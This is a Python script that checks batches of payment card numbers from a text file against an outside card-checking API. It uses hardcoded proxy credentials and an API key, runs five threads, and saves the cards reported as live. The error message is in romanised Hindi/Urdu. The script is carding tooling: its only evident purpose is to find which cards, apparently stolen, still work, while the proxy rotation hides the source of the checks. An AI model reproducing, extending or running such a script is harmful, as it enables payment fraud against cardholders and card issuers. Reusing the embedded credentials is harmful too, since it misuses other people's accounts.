from concurrent.futures import ThreadPoolExecutor, as_completed
import queue
import time
import requests

API_KEY = "6TI7XuaO9TUlxeX8zprucZVd1bzmEJU5"
INPUT_FILE = "cards.txt"
OUTPUT_FILE = "live_cards.txt"

# Webshare proxies list[cite: 1]
proxies_list = [
    "http://ehrwdpfm:0t99iv8pqfgb@45.38.107.97:6014",
    "http://ehrwdpfm:0t99iv8pqfgb@64.137.96.74:6641",
    "http://ehrwdpfm:0t99iv8pqfgb@198.23.243.226:6361",
    "http://ehrwdpfm:0t99iv8pqfgb@38.154.185.97:6370",
    "http://ehrwdpfm:0t99iv8pqfgb@84.247.60.125:6095",
    "http://ehrwdpfm:0t99iv8pqfgb@191.96.254.138:6185",
    "http://ehrwdpfm:0t99iv8pqfgb@198.46.161.42:5092",
    "http://ehrwdpfm:0t99iv8pqfgb@64.137.10.153:5803",
    "http://ehrwdpfm:0t99iv8pqfgb@104.164.49.38:7693",
    "http://ehrwdpfm:0t99iv8pqfgb@23.26.71.145:5628",
]

proxy_queue = queue.Queue()
for p in proxies_list:
  proxy_queue.put(p)


def check_card(card_data):
  proxy_url = proxy_queue.get()
  proxies = {"http": proxy_url, "https": proxy_url}

  url = f"https://www.dorkill.com/api/check?key={API_KEY}&card={card_data}"
  try:
    response = requests.get(url, proxies=proxies, timeout=10)
    result = response.text.strip()
    proxy_queue.put(proxy_url)
    return card_data, result
  except Exception as e:
    proxy_queue.put(proxy_url)
    return card_data, None


def main():
  try:
    with open(INPUT_FILE, "r") as file:
      cards = [line.strip() for line in file if line.strip()]

    print(f"Total {len(cards)} cards loaded. Fast checking started...\n")

    # Multithreading enabled (`max_workers=5`)
    with ThreadPoolExecutor(max_workers=5) as executor:
      futures = {executor.submit(check_card, card): card for card in cards}

      for future in as_completed(futures):
        card, res = future.result()
        if res:
          print(f"Card: {card} | Response: {res}")
          if (
              "live" in res.lower()
              or "approved" in res.lower()
              or "success" in res.lower()
          ):
            print(f"--> [LIVE] Saved: {card}")
            with open(OUTPUT_FILE, "a") as out:
              out.write(card + "\n")
          else:
            print(f"--> [DEAD]")
        else:
          print(f"--> Error checking {card}")
        print("-" * 30)

    print(f"\nChecking finished! Live cards saved in '{OUTPUT_FILE}'.")

  except FileNotFoundError:
    print(
        f"'{INPUT_FILE}' file nahi mili! Pehle file bana kar usme cards save"
        " karein."
    )


if __name__ == "__main__":
  main()
